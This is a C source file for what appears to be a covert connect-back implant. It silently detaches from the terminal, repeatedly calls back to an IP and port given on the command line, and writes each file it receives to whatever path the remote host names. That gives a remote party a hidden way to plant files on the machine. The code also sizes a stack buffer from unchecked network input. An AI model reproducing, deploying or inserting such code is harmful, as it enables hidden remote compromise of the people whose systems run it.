#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#define FNFE -1 // FNF: File Not Found Error
int backit(){
    int pid,sid;
    close (0);close (1);close(2);
    if ((pid=fork())<0){exit(1);}if((pid=fork())>0){exit(0);}
    if ((sid=setsid())<0){exit(1);}
}
int dshow(char msg[]){
    printf("%s\n",msg);
}
int recvfile(char ip[], int portn){
   char filename[256];
   int sfd=socket(AF_INET,SOCK_STREAM,0);
   struct sockaddr_in adr={ .sin_port=htons(portn), .sin_family=AF_INET };
   inet_pton(AF_INET,ip, &adr.sin_addr.s_addr);
   while (1){
   int cnt=connect(sfd,(struct sockaddr*)&adr, sizeof(adr));
   if(cnt==-1){sleep(20);}else{break;}}
   while (1){
   char bof_buffer[100];
   char filesize[10];
   int snd =recv(sfd,filesize,sizeof(filesize),0);
   char data[atoi(filesize)];
   int snd1=recv(sfd,data,sizeof(data),0);
   int snd2=recv(sfd,filename,sizeof(filename),0);
   int fn=open(filename, O_WRONLY|O_CREAT|O_TRUNC);
   write(fn,data,sizeof(data));
   bzero(&data,sizeof(data));
   bzero(filename,sizeof(filename));
   bzero(filesize,sizeof(filesize));
   sleep (2);
   }
}
int main(int argc, char *argv[]){
     backit();
     int res=recvfile(argv[1], atoi(argv[2]));
     return res;
}
